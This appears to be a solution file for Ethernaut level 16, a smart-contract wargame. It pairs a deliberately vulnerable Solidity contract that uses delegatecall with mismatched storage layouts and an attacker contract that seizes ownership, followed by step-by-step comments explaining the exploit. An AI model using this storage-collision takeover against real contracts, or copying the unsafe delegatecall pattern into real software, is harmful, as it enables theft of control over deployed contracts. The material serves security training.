// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EthernautSixteenPreservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract EthernautSixteenLibraryContract {
    // stores a timestamp
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

contract EthernautSixteenAttacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _timeStamp) external {
        owner = tx.origin;
    }
}

// https://ethernaut.openzeppelin.com/level/0x2754fA769d47ACdF1f6cDAa4B0A8Ca4eEba651eC

// Solution:
// This is a clever problem
// 1. Write a attack contract with the same storage variable layouts EthernautSixteenPreservation
// 2. Add a setTime(uint _timeStamp) function to it which just sets owner = tx.origin
// 3. Now we need to set this attack contract address as the value of timeZone1Library
//    We can easily do that by padding the address to 32 bytes and calling setFirstTime/setSecondTime with it
//    EthernautSixteenLibraryContract sets the first storage slot to whatever the argument of setFirstTime/setSecondTime is
// 4. Now we can just call setFirstTime of EthernautSixteenPreservation. That calls our attacker contract which correctly
//    updates the owner field
// 5. Exploited. This shows why you need to be careful to have the delegate contract have the same order of storage slots
